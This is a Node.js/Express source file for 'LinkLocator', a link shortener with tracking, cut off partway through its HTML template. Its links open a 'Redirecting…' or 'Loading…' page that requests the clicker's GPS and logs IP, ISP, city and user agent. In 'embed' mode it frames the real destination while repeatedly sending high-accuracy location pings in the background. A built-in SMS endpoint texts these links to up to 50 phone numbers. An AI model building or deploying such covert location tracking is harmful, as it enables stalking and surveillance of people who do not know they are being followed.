const express = require("express");
const { nanoid } = require("nanoid");
const fs = require("fs");
const path = require("path");

// ─── Database Abstraction ──────────────────────────────────────
// Supports Postgres (DATABASE_URL) or SQLite (sql.js) as fallback

function createSqliteDb() {
  const initSqlJs = require("sql.js");
  const DB_PATH = path.join(process.env.DATA_DIR || __dirname, "linklocator.sqlite");

  return initSqlJs().then(SQL => {
    let db;
    if (fs.existsSync(DB_PATH)) {
      db = new SQL.Database(fs.readFileSync(DB_PATH));
    } else {
      db = new SQL.Database();
    }

    let saveTimer = null;
    function save() {
      // Debounced: batch writes instead of fs.writeFileSync on every insert
    // Note: SIGKILL/OOM kills process before timer fires — up to 500ms of data loss
    // This is acceptable for analytics; SIGTERM/SIGINT trigger saveNow() for clean shutdown
      if (saveTimer) return;
      saveTimer = setTimeout(() => {
        try { fs.writeFileSync(DB_PATH, Buffer.from(db.export())); } catch (e) { console.error("sqlite save error:", e.message); }
        saveTimer = null;
      }, 500);
    }
    // Immediate save for schema init and explicit shutdown
    function saveNow() {
      if (saveTimer) { clearTimeout(saveTimer); saveTimer = null; }
      try { fs.writeFileSync(DB_PATH, Buffer.from(db.export())); } catch (e) { console.error("sqlite save error:", e.message); }
    }

    db.run(`CREATE TABLE IF NOT EXISTS links (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      slug TEXT UNIQUE NOT NULL,
      destination TEXT NOT NULL,
      label TEXT,
      tracking_mode TEXT DEFAULT 'redirect',
      gps_interval INTEGER DEFAULT 30,
      max_pings INTEGER DEFAULT 100,
      created_at TEXT DEFAULT (datetime('now')),
      active INTEGER DEFAULT 1
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS clicks (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      link_id INTEGER NOT NULL,
      ip TEXT,
      referrer TEXT,
      user_agent TEXT,
      country TEXT,
      region TEXT,
      city TEXT,
      lat REAL,
      lon REAL,
      isp TEXT,
      gps_accuracy REAL,
      clicked_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE CASCADE
    )`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_clicks_link ON clicks(link_id)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_clicks_at ON clicks(clicked_at)`);
    db.run(`CREATE TABLE IF NOT EXISTS location_pings (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      click_id INTEGER NOT NULL,
      lat REAL,
      lon REAL,
      accuracy REAL,
      pinged_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (click_id) REFERENCES clicks(id) ON DELETE CASCADE
    )`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_pings_click ON location_pings(click_id)`);
    saveNow();

    // SQLite WAL mode for better read concurrency
    try { db.run("PRAGMA journal_mode=WAL"); } catch (e) { console.error("WAL set failed:", e.message); }
    // Enforce foreign keys (off by default in SQLite)
    try { db.run("PRAGMA foreign_keys=ON"); } catch (e) { console.error("FK pragma failed:", e.message); }

    process.on("SIGINT", () => { saveNow(); process.exit(0); });
    process.on("SIGTERM", () => { saveNow(); process.exit(0); });

    return {
      type: "sqlite",
      all(stmt, params = []) {
        const s = db.prepare(stmt); s.bind(params);
        const rows = []; try { while (s.step()) rows.push(s.getAsObject()); } finally { s.free(); }
        return rows;
      },
      get(stmt, params = []) {
        return this.all(stmt, params)[0] || null;
      },
      async run(stmt, params = []) {
        db.run(stmt, params); save();
      },
    };
  });
}

function createPostgresDb() {
  const { Pool } = require("pg");
  const poolOpts = { connectionString: process.env.DATABASE_URL };
  if (!process.env.DATABASE_URL.includes("sslmode=")) poolOpts.ssl = { rejectUnauthorized: false };
  const pool = new Pool(poolOpts);
  pool.on("error", (err) => console.error("Postgres pool error:", err.message));

  return pool.query(`
    CREATE TABLE IF NOT EXISTS links (
      id SERIAL PRIMARY KEY,
      slug TEXT UNIQUE NOT NULL,
      destination TEXT NOT NULL,
      label TEXT,
      tracking_mode TEXT DEFAULT 'redirect',
      gps_interval INTEGER DEFAULT 30,
      max_pings INTEGER DEFAULT 100,
      created_at TIMESTAMPTZ DEFAULT NOW(),
      active BOOLEAN DEFAULT TRUE
    );
    CREATE TABLE IF NOT EXISTS clicks (
      id SERIAL PRIMARY KEY,
      link_id INTEGER NOT NULL REFERENCES links(id) ON DELETE CASCADE,
      ip TEXT,
      referrer TEXT,
      user_agent TEXT,
      country TEXT,
      region TEXT,
      city TEXT,
      lat DOUBLE PRECISION,
      lon DOUBLE PRECISION,
      isp TEXT,
      gps_accuracy DOUBLE PRECISION,
      clicked_at TIMESTAMPTZ DEFAULT NOW()
    );
    CREATE INDEX IF NOT EXISTS idx_clicks_link ON clicks(link_id);
    CREATE INDEX IF NOT EXISTS idx_clicks_at ON clicks(clicked_at);
    CREATE TABLE IF NOT EXISTS location_pings (
      id SERIAL PRIMARY KEY,
      click_id INTEGER NOT NULL REFERENCES clicks(id) ON DELETE CASCADE,
      lat DOUBLE PRECISION,
      lon DOUBLE PRECISION,
      accuracy DOUBLE PRECISION,
      pinged_at TIMESTAMPTZ DEFAULT NOW()
    );
    CREATE INDEX IF NOT EXISTS idx_pings_click ON location_pings(click_id);
  `).then(() => ({
    type: "postgres",
    async all(text, params = []) {
      const { rows } = await pool.query(text, params);
      return rows;
    },
    async get(text, params = []) {
      const { rows } = await pool.query(text, params);
      return rows[0] || null;
    },
    async run(text, params = []) {
      await pool.query(text, params);
    },
  })).then(db => {
    process.on("SIGINT", () => { pool.end().then(() => process.exit(0)); });
    process.on("SIGTERM", () => { pool.end().then(() => process.exit(0)); });
    return db;
  });
}

// ─── Main ──────────────────────────────────────────────────────

async function main() {
  const db = process.env.DATABASE_URL
    ? await createPostgresDb()
    : await createSqliteDb();

  console.log(`📦 Database: ${db.type}`);

  const app = express();
  app.set("trust proxy", 1); // Trust first proxy (Railway / nginx)
  app.use(express.json({ limit: "1mb", strict: true })); // strict: reject non-objects at top level

  // Wrap async route handlers so Express 4 catches rejected promises
  function asyncHandler(fn) {
    return (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
  }

  // Handle JSON parse errors with 400 instead of default 500
  // (defined early so it catches errors from express.json() before routes)
  app.use((err, req, res, next) => {
    if (err.type === "entity.parse.failed") return res.status(400).json({ error: "invalid JSON body" });
    next(err);
  });

  // Security headers
  app.use((req, res, next) => {
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("X-Frame-Options", "SAMEORIGIN");
    res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
    res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=()");
    // CSP: restrict script/frame/img/connect sources; inline scripts/styles needed for interstitial + dashboard
    res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; frame-src https://www.google.com; connect-src 'self'; font-src 'self'");
    if (req.secure || req.headers["x-forwarded-proto"] === "https") res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
    res.removeHeader("X-Powered-By");
    next();
  });

  // Health check (for Railway / monitoring)
  app.get("/api/health", (req, res) => res.json({ status: "ok", db: db.type, uptime: process.uptime() }));

  // Skip common static paths that aren't short links
  const STATIC_PATHS = ["/favicon.ico", "/robots.txt", "/sitemap.xml", "/.well-known"];
  app.use((req, res, next) => {
    if (STATIC_PATHS.some(p => req.path.startsWith(p))) return res.status(204).end();
    next();
  });

  const BASE_URL = process.env.BASE_URL || "";

  // ─── Geo IP lookup ─────────────────────────────────────────────
  const GEO_API_KEY = process.env.GEO_API_KEY; // ipgeolocation.io key
  const geoCache = new Map();
  const GEO_CACHE_TTL = 3600000;
  const GEO_CACHE_MAX = 5000;

  function pruneGeoCache() {
    if (geoCache.size <= GEO_CACHE_MAX) return;
    const now = Date.now();
    for (const [k, v] of geoCache) {
      if (now - v.ts > GEO_CACHE_TTL) geoCache.delete(k);
      if (geoCache.size <= GEO_CACHE_MAX) return;
    }
    // Still too big? Evict oldest
    const entries = [...geoCache.entries()].sort((a, b) => a[1].ts - b[1].ts);
    for (let i = 0; i < entries.length - GEO_CACHE_MAX / 2; i++) geoCache.delete(entries[i][0]);
  }

  async function lookupGeo(ip) {
    // Skip local/private IPs (172.16.0.0–172.31.255.255 is the actual private range)
    // Also skip IPv6 private: fc00::/7 (unique local), fe80::/10 (link-local)
    if (!ip || ip === "unknown" || ip === "::1" || ip.startsWith("::ffff:127") || ip.startsWith("192.168.") || ip.startsWith("10.")) {
      return { country: "Local", region: "Local", city: "Local", lat: null, lon: null, isp: null };
    }
    // Check IPv4 loopback (127.0.0.0/8) and 172.16.0.0/12 private ranges
    const ipParts = ip.replace(/^::ffff:/, "").split(".");
    if (ipParts.length === 4) {
      const a = parseInt(ipParts[0], 10), b = parseInt(ipParts[1], 10);
      if (a === 127) return { country: "Local", region: "Local", city: "Local", lat: null, lon: null, isp: null };
      if (a === 172 && b >= 16 && b <= 31) return { country: "Local", region: "Local", city: "Local", lat: null, lon: null, isp: null };
    }
    // IPv6 private ranges
    if (/^f[cd][0-9a-f]{2}:/i.test(ip) || /^fe[89ab][0-9a-f]:/i.test(ip)) {
      return { country: "Local", region: "Local", city: "Local", lat: null, lon: null, isp: null };
    }
    const cached = geoCache.get(ip);
    if (cached && Date.now() - cached.ts < GEO_CACHE_TTL) return cached.data;
    let fetchTimeout;
    try {
      const controller = new AbortController();
      fetchTimeout = setTimeout(() => controller.abort(), 5000);
      if (!GEO_API_KEY) {
        // Fallback: ip-api.com (free, no key, 45 req/min) — free tier only supports HTTP
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`, { signal: controller.signal });
        clearTimeout(fetchTimeout);
        const data = await res.json();
        if (data.status === "success") {
          const geo = { country: data.country || null, region: data.regionName || null, city: data.city || null, lat: data.lat || null, lon: data.lon || null, isp: data.isp || null };
          geoCache.set(ip, { data: geo, ts: Date.now() }); pruneGeoCache();
          return geo;
        }
        return { country: null, region: null, city: null, lat: null, lon: null, isp: null };
      }
      // ipgeolocation.io (30k req/mo free, paid for more)
      const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${GEO_API_KEY}&ip=${ip}&fields=country_name,state_prov,city,latitude,longitude,isp`, { signal: controller.signal });
      clearTimeout(fetchTimeout);
      const data = await res.json();
      if (data.country_name) {
        const geo = { country: data.country_name || null, region: data.state_prov || null, city: data.city || null, lat: data.latitude ? parseFloat(data.latitude) : null, lon: data.longitude ? parseFloat(data.longitude) : null, isp: data.isp || null };
        geoCache.set(ip, { data: geo, ts: Date.now() }); pruneGeoCache();
        return geo;
      }
    } catch (e) { console.error("geo lookup error:", e.message); }
    // Ensure timeout always cleaned up on any exit path
    if (fetchTimeout) clearTimeout(fetchTimeout);
    return { country: null, region: null, city: null, lat: null, lon: null, isp: null };
  }

  function baseUrl(req) {
    if (BASE_URL) return BASE_URL;
    // Auto-detect from request
    const proto = req.headers["x-forwarded-proto"] || (req.secure ? "https" : "http");
    const host = req.headers["host"] || "localhost";
    return `${proto}://${host}`;
  }

  // ─── API: Create Link ──────────────────────────────────────────
  app.post("/api/links", asyncHandler(async (req, res) => {
    if (!req.body || typeof req.body !== "object") return res.status(400).json({ error: "JSON body required" });
    const { destination, label, slug: customSlug, tracking_mode, gps_interval, max_pings } = req.body;
    if (!destination) return res.status(400).json({ error: "destination is required" });
    try { const u = new URL(destination); if (!["http:","https:"].includes(u.protocol)) return res.status(400).json({ error: "only http/https destinations allowed" }); if (u.href.startsWith("//")) return res.status(400).json({ error: "protocol-relative URLs not allowed" }); } catch { return res.status(400).json({ error: "invalid destination URL" }); }
    // Prevent self-referential links (infinite redirect loop)
    try { const dest = new URL(destination); const self = new URL(baseUrl(req)); if (dest.origin === self.origin) return res.status(400).json({ error: "destination cannot point to this app" }); } catch {}
    if (destination.length > 2048) return res.status(400).json({ error: "destination URL too long (max 2048)" });
    if (label && label.length > 200) return res.status(400).json({ error: "label too long (max 200)" });
    // Limit total links
    const count = await db.get("SELECT COUNT(*) as cnt FROM links");
    if (Number(count?.cnt || 0) >= 1000) return res.status(429).json({ error: "link limit reached (1000). Delete some to create more." });

    const slug = customSlug || nanoid(8);
    // Validate slug: URL-safe, 1-64 chars, no path traversal
    if (!/^[a-zA-Z0-9_-]+$/.test(slug)) return res.status(400).json({ error: "slug must be alphanumeric, hyphens, or underscores only" });
    if (slug.length > 64) return res.status(400).json({ error: "slug too long (max 64)" });
    if (slug.length < 1) return res.status(400).json({ error: "slug too short" });
    // Reserved slugs that would shadow API routes
    const RESERVED = ["api", "health", "links", "sms", "whoami", "click", "favicon", "robots"];
    if (RESERVED.includes(slug.toLowerCase())) return res.status(400).json({ error: `slug '${slug}' is reserved` });
    const existing = await db.get("SELECT id FROM links WHERE slug = $1", [slug]);
    if (existing) return res.status(409).json({ error: "slug already in use" });

    // Validate tracking options
    const validMode = (tracking_mode === "embed") ? "embed" : "redirect";
    const interval = (typeof gps_interval === "number" && gps_interval >= 5 && gps_interval <= 3600) ? Math.round(gps_interval) : 30;
    const maxPings = (typeof max_pings === "number" && max_pings >= 0 && max_pings <= 10000) ? Math.round(max_pings) : 100;

    // If embed mode, check that the destination allows iframing
    let iframeWarning = null;
    if (validMode === "embed") {
      try {
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 5000);
        const headRes = await fetch(destination, { method: "HEAD", signal: ctrl.signal, redirect: "follow" });
        clearTimeout(t);
        const xfo = headRes.headers.get("x-frame-options");
        const csp = headRes.headers.get("content-security-policy") || "";
        if (xfo && (xfo.toLowerCase() === "deny" || xfo.toLowerCase() === "sameorigin")) {
          iframeWarning = `Destination sends X-Frame-Options: ${xfo} — iframe will be blocked`;
        } else if (csp && /frame-ancestors\s+('none'|"none"|none)/i.test(csp)) {
          iframeWarning = "Destination CSP blocks framing (frame-ancestors 'none') — iframe will be blocked";
        }
      } catch (e) {
        // Can't reach destination to check — allow but warn
        iframeWarning = "Could not verify destination allows iframing (request failed)";
      }
    }

    await db.run("INSERT INTO links (slug, destination, label, tracking_mode, gps_interval, max_pings) VALUES ($1, $2, $3, $4, $5, $6)", [slug, destination, label || null, validMode, interval, maxPings]);
    const link = await db.get("SELECT * FROM links WHERE slug = $1", [slug]);
    res.status(201).json({ ...link, active: !!link.active, short_url: `${baseUrl(req)}/${slug}`, iframe_warning: iframeWarning });
  }));

  // ─── API: List Links ───────────────────────────────────────────
  app.get("/api/links", asyncHandler(async (req, res) => {
    const links = await db.all(`
      SELECT l.*, (SELECT COUNT(*) FROM clicks c WHERE c.link_id = l.id) as click_count
      FROM links l ORDER BY l.created_at DESC
    `);
    res.json(links.map(l => ({ ...l, active: !!l.active, click_count: Number(l.click_count) })));
  }));

  // ─── API: Get Link Detail ──────────────────────────────────────
  app.get("/api/links/:slug", asyncHandler(async (req, res) => {
    const link = await db.get("SELECT * FROM links WHERE slug = $1", [req.params.slug]);
    if (!link) return res.status(404).json({ error: "link not found" });

    const [clicks, stats, byDay, byCountry, byCity, pings] = await Promise.all([
      db.all("SELECT * FROM clicks WHERE link_id = $1 ORDER BY clicked_at DESC LIMIT 200", [link.id]),
      db.get(`SELECT COUNT(*) as total, COUNT(DISTINCT ip) as unique_ips,
              MIN(clicked_at) as first_click, MAX(clicked_at) as last_click
              FROM clicks WHERE link_id = $1`, [link.id]),
      db.all(`SELECT DATE(clicked_at) as day, COUNT(*) as count
              FROM clicks WHERE link_id = $1 GROUP BY day ORDER BY day DESC LIMIT 30`, [link.id]),
      db.all(`SELECT country, COUNT(*) as count
              FROM clicks WHERE link_id = $1 AND country IS NOT NULL
              GROUP BY country ORDER BY count DESC LIMIT 15`, [link.id]),
      db.all(`SELECT city, region, country, COUNT(*) as count
              FROM clicks WHERE link_id = $1 AND city IS NOT NULL
              GROUP BY city, region, country ORDER BY count DESC LIMIT 15`, [link.id]),
      db.all("SELECT lp.* FROM location_pings lp JOIN clicks c ON lp.click_id = c.id WHERE c.link_id = $1 ORDER BY lp.pinged_at ASC", [link.id]),
    ]);

    res.json({
      ...link, active: !!link.active,
      short_url: `${baseUrl(req)}/${link.slug}`,
      stats: { total: Number(stats?.total || 0), unique_ips: Number(stats?.unique_ips || 0), first_click: stats?.first_click || null, last_click: stats?.last_click || null },
      by_day: byDay, by_country: byCountry, by_city: byCity,
      recent_clicks: clicks,
      location_pings: pings,
    });
  }));

  // ─── API: Toggle Active ────────────────────────────────────────
  app.patch("/api/links/:slug/toggle", asyncHandler(async (req, res) => {
    const link = await db.get("SELECT * FROM links WHERE slug = $1", [req.params.slug]);
    if (!link) return res.status(404).json({ error: "link not found" });
    await db.run("UPDATE links SET active = $1 WHERE id = $2", [!link.active, link.id]);
    const updated = await db.get("SELECT * FROM links WHERE id = $1", [link.id]);
    res.json({ ...updated, active: !!updated.active });
  }));

  // ─── API: Delete Link ──────────────────────────────────────────
  app.delete("/api/links/:slug", asyncHandler(async (req, res) => {
    const link = await db.get("SELECT * FROM links WHERE slug = $1", [req.params.slug]);
    if (!link) return res.status(404).json({ error: "link not found" });
    await db.run("DELETE FROM links WHERE id = $1", [link.id]);
    // CASCADE auto-removes clicks (Postgres always, SQLite with PRAGMA foreign_keys=ON)
    res.json({ deleted: true });
  }));

  // ─── API: Debug my IP ─────────────────────────────────────────
  app.get("/api/whoami", asyncHandler(async (req, res) => {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
    const geo = await lookupGeo(ip);
    res.json({
      ip_seen: ip,
      forwarded_for: req.headers["x-forwarded-for"] || null,
      geo,
      hint: ["unknown", "127.0.0.1", "::1"].includes(ip) ? "You're hitting localhost — deploy behind a proxy with X-Forwarded-For to see real IP." : undefined,
    });
  }));

  // ─── API: Record Click (called by interstitial JS) ───────────
  app.post("/api/click", asyncHandler(async (req, res) => {
    if (!req.body || typeof req.body !== "object") return res.status(400).json({ error: "JSON body required" });
    const { slug, gps_lat, gps_lon, gps_accuracy } = req.body;
    if (!slug) return res.status(400).json({ error: "slug required" });
    // Validate GPS values are numeric
    const lat = typeof gps_lat === "number" ? gps_lat : undefined;
    const lon = typeof gps_lon === "number" ? gps_lon : undefined;
    const acc = typeof gps_accuracy === "number" ? gps_accuracy : undefined;

    const link = await db.get("SELECT * FROM links WHERE slug = $1", [slug]);
    if (!link) return res.status(404).json({ error: "link not found" });
    if (!link.active) return res.status(410).json({ error: "link is paused" });

    const ip = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
    const referrer = req.headers.referer || null;
    const ua = req.headers["user-agent"] || null;

    // Insert click first (need ID for embed mode pings), then update geo async
    const geo = await lookupGeo(ip);
    let clickLat = geo.lat, clickLon = geo.lon, clickAcc = null;
    if (lat != null && lon != null && lat >= -90 && lat <= 90 && lon >= -180 && lon <= 180) {
      clickLat = lat; clickLon = lon; clickAcc = acc != null && acc > 0 ? acc : null;
    }
    await db.run(
      "INSERT INTO clicks (link_id, ip, referrer, user_agent, country, region, city, lat, lon, isp, gps_accuracy) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)",
      [link.id, ip, referrer, ua, geo.country, geo.region, geo.city, clickLat, clickLon, geo.isp, clickAcc]
    );
    const clickRow = await db.get("SELECT id FROM clicks WHERE link_id = $1 ORDER BY id DESC LIMIT 1", [link.id]);
    res.json({ ok: true, click_id: clickRow?.id || null });
  }));

  // ─── Redirect via interstitial (grabs GPS) ───────────────────
  app.get("/:slug", asyncHandler(async (req, res) => {
    const link = await db.get("SELECT * FROM links WHERE slug = $1", [req.params.slug]);
    if (!link) return res.status(404).json({ error: "link not found" });
    if (!link.active) return res.status(410).json({ error: "link is paused" });

    // Serve interstitial that grabs GPS, POSTs click, then redirects or embeds
    res.send(interstitialHTML(link.slug, link.destination, link.tracking_mode || "redirect", Number(link.gps_interval || 30), Number(link.max_pings || 100)));
  }));

  // ─── API: Location Ping (background GPS from embed mode) ─────
  app.post("/api/ping", asyncHandler(async (req, res) => {
    if (!req.body || typeof req.body !== "object") return res.status(400).json({ error: "JSON body required" });
    const { click_id, lat, lon, accuracy } = req.body;
    if (!click_id) return res.status(400).json({ error: "click_id required" });
    if (typeof lat !== "number" || typeof lon !== "number") return res.status(400).json({ error: "lat and lon must be numbers" });
    if (lat < -90 || lat > 90 || lon < -180 || lon > 180) return res.status(400).json({ error: "invalid coordinates" });
    // Verify click exists and get link to check max_pings
    const click = await db.get("SELECT id, link_id FROM clicks WHERE id = $1", [click_id]);
    if (!click) return res.status(404).json({ error: "click not found" });
    const link = await db.get("SELECT max_pings FROM links WHERE id = $1", [click.link_id]);
    const maxPings = Number(link?.max_pings || 100);
    if (maxPings > 0) {
      const pingCount = await db.get("SELECT COUNT(*) as cnt FROM location_pings WHERE click_id = $1", [click_id]);
      if (Number(pingCount?.cnt || 0) >= maxPings) return res.status(429).json({ error: "ping limit reached" });
    }
    await db.run("INSERT INTO location_pings (click_id, lat, lon, accuracy) VALUES ($1, $2, $3, $4)", [click_id, lat, lon, typeof accuracy === "number" && accuracy > 0 ? accuracy : null]);
    res.json({ ok: true });
  }));

  // ─── SMS: Send tracked link via text ───────────────────────────
  // Supports: SignalWire (default), Telnyx, Vonage, or generic webhook
  const SMS_PROVIDER = process.env.SMS_PROVIDER || "signalwire"; // signalwire | telnyx | vonage | webhook
  const SMS_FROM = process.env.SMS_FROM || ""; // phone number or sender ID

  async function sendSMS(to, body) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000); // 15s per SMS
    try {
    if (SMS_PROVIDER === "signalwire") {
      const SW_SPACE = process.env.SIGNALWIRE_SPACE;  // e.g. "your-space"
      const SW_PROJECT = process.env.SIGNALWIRE_PROJECT_ID;
      const SW_TOKEN = process.env.SIGNALWIRE_API_TOKEN;
      if (!SW_SPACE || !SW_PROJECT || !SW_TOKEN) throw new Error("SIGNALWIRE_SPACE + SIGNALWIRE_PROJECT_ID + SIGNALWIRE_API_TOKEN not set");
      if (!SMS_FROM) throw new Error("SMS_FROM not set");
      const res = await fetch(`https://${SW_SPACE}.signalwire.com/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Messages.json`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded", "Authorization": `Basic ${Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64")}` },
        body: new URLSearchParams({ From: SMS_FROM, To: to, Body: body }).toString(),
        signal: controller.signal,
      });
      const data = await res.json();
      if (data.code || data.error_message) throw new Error(data.error_message || data.message || "SignalWire error");
      return { id: data.sid, status: data.status || "sent", provider: "signalwire" };
    }
    if (SMS_PROVIDER === "telnyx") {
      const TELNYX_KEY = process.env.TELNYX_API_KEY;
      if (!TELNYX_KEY) throw new Error("TELNYX_API_KEY not set");
      if (!SMS_FROM) throw new Error("SMS_FROM not set");
      const res = await fetch("https://api.telnyx.com/v2/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": `Bearer ${TELNYX_KEY}` },
        body: JSON.stringify({ from: SMS_FROM, to, text: body }),
        signal: controller.signal,
      });
      const data = await res.json();
      if (data.errors) throw new Error(data.errors[0]?.message || "Telnyx error");
      return { id: data.data?.id, status: data.data?.message_status_text || "sent", provider: "telnyx" };
    }
    if (SMS_PROVIDER === "vonage") {
      const VONAGE_KEY = process.env.VONAGE_API_KEY;
      const VONAGE_SECRET = process.env.VONAGE_API_SECRET;
      if (!VONAGE_KEY || !VONAGE_SECRET) throw new Error("VONAGE_API_KEY + VONAGE_API_SECRET not set");
      if (!SMS_FROM) throw new Error("SMS_FROM not set");
      const res = await fetch(`https://rest.nexmo.com/sms/json`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({ api_key: VONAGE_KEY, api_secret: VONAGE_SECRET, from: SMS_FROM, to, text: body }).toString(),
        signal: controller.signal,
      });
      const data = await res.json();
      if (data.messages?.[0]?.status !== "0") throw new Error(data.messages?.[0]?.error_text || "Vonage error");
      return { id: data.messages?.[0]?.message_id, status: "sent", provider: "vonage" };
    }
    if (SMS_PROVIDER === "webhook") {
      const WEBHOOK_URL = process.env.SMS_WEBHOOK_URL;
      if (!WEBHOOK_URL) throw new Error("SMS_WEBHOOK_URL not set");
      const res = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ from: SMS_FROM, to, text: body }),
        signal: controller.signal,
      });
      const data = await res.json();
      return { status: "sent", provider: "webhook", ...data };
    }
    throw new Error(`Unknown SMS_PROVIDER: ${SMS_PROVIDER}`);
    } finally { clearTimeout(timeout); }
  }

  // ─── API: Send SMS ──────────────────────────────────────────────
  app.post("/api/links/:slug/sms", asyncHandler(async (req, res) => {
    if (!req.body || typeof req.body !== "object") return res.status(400).json({ error: "JSON body required" });
    const { to, message } = req.body;
    if (!to) return res.status(400).json({ error: "'to' is required (phone number or array of numbers)" });

    const link = await db.get("SELECT * FROM links WHERE slug = $1", [req.params.slug]);
    if (!link) return res.status(404).json({ error: "link not found" });

    const shortUrl = `${baseUrl(req)}/${link.slug}`;
    const numbers = Array.isArray(to) ? to : [to];
    if (numbers.length > 50) return res.status(400).json({ error: "max 50 recipients per request" });
    // Basic E.164 phone number validation: + followed by 7-15 digits
    const isValidPhone = n => /^\+[1-9]\d{6,14}$/.test(String(n).replace(/[\s()-]/g, ""));
    const invalidNums = numbers.filter(n => !isValidPhone(n));
    if (invalidNums.length) return res.status(400).json({ error: `invalid phone number(s): ${invalidNums.join(", ")}. Use E.164 format: +15551234567` });
    const body = message ? message.replace("{link}", shortUrl) : `${link.label ? link.label + ": " : ""}${shortUrl}`;
    if (body.length > 1600) return res.status(400).json({ error: "message too long (max 1600 chars — 10 SMS segments)" });

    // Send in parallel (up to 50) with Promise.allSettled for speed
    const results = await Promise.allSettled(numbers.map(async num => {
      try {
        const result = await sendSMS(num, body);
        return { to: num, ...result };
      } catch (e) {
        return { to: num, status: "error", error: e.message };
      }
    }));
    const settled = results.map(r => r.status === "fulfilled" ? r.value : { status: "error", error: r.reason?.message || String(r.reason) });
    res.json({ sent: settled.filter(r => r.status !== "error").length, failed: settled.filter(r => r.status === "error").length, results: settled });
  }));

  // ─── API: SMS status (check if configured) ──────────────────────
  app.get("/api/sms/status", (req, res) => {
    const configured = {
      signalwire: !!(process.env.SIGNALWIRE_SPACE && process.env.SIGNALWIRE_PROJECT_ID && process.env.SIGNALWIRE_API_TOKEN && SMS_FROM),
      telnyx: !!(process.env.TELNYX_API_KEY && SMS_FROM),
      vonage: !!(process.env.VONAGE_API_KEY && process.env.VONAGE_API_SECRET && SMS_FROM),
      webhook: !!process.env.SMS_WEBHOOK_URL,
    };
    res.json({ provider: SMS_PROVIDER, configured: configured[SMS_PROVIDER], from: SMS_FROM || null });
  });

  // ─── Dashboard ─────────────────────────────────────────────────
  const DASH_HTML = dashboardHTML(); // Cache — static, no per-request data
  app.get("/", (req, res) => { res.setHeader("Cache-Control", "public, max-age=3600"); res.send(DASH_HTML); });

  // 404 for any unmatched routes (after all API + slug routes)
  app.use((req, res) => { res.status(404).json({ error: "not found" }); });

  // Catch-all error handler — returns JSON instead of Express default HTML 500
  app.use((err, req, res, next) => {
    console.error("Unhandled route error:", err.message || err);
    res.status(err.status || 500).json({ error: err.message || "internal server error" });
  });

  const PORT = process.env.PORT || 3000;
  const server = app.listen(PORT, () => {
    console.log(`\n🔗  LinkLocator running at http://localhost:${PORT}`);
    console.log(`    Dashboard:  http://localhost:${PORT}/`);
    console.log(`    API:        http://localhost:${PORT}/api/links`);
    console.log(`    DB:         ${db.type}${process.env.DATABASE_URL ? " (Postgres)" : " (SQLite)"}\n`);
  });
  server.timeout = 30000; // 30s request timeout
}

function interstitialHTML(slug, destination, trackingMode, gpsInterval, maxPings) {
  // Safety: re-validate destination protocol in case DB was modified directly
  if (!/^https?:\/\//i.test(destination)) destination = "about:blank";
  // HTML-escape destination for attribute contexts (prevents XSS via " in URL)
  const destEsc = destination.replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
  const isEmbed = trackingMode === "embed";
  const title = isEmbed ? "Loading…" : "Redirecting…";
  const pingJS = isEmbed ? `
let CLICK_ID = null;
let pingCount = 0;
const PING_INTERVAL = ${gpsInterval * 1000};
const MAX_PINGS = ${maxPings};

function postPing(lat, lon, accuracy) {
  if (!CLICK_ID) return;
  if (MAX_PINGS > 0 && pingCount >= MAX_PINGS) { if (navigator.geolocation && geoWatchId != null) navigator.geolocation.clearWatch(geoWatchId); return; }
  const blob = new Blob([JSON.stringify({ click_id: CLICK_ID, lat, lon, accuracy })], { type: 'application/json' });
  if (navigator.sendBeacon) { navigator.sendBeacon('/api/ping', blob); }
  else { fetch('/api/ping', { method: 'POST', body: blob, keepalive: true }).catch(() => {}); }
  pingCount++;
}

let geoWatchId = null;
function startTracking() {
  if (!navigator.geolocation) return;
  geoWatchId = navigator.geolocation.watchPosition(
    pos => postPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
    () => {},
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

function stopTracking() {
  if (geoWatchId != null) navigator.geolocation.clearWatch(geoWatchId);
}

// Stop tracking when page is hidden/closed
document.addEventListener('visibilitychange', () => { if (document.hidden) stopTracking(); else startTracking(); });
window.addEventListener('beforeunload', stopTracking);` : "";

  return `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>${title}</title><style>
body{font-family:system-ui;margin:0;background:#0f1117;color:#71717a;}
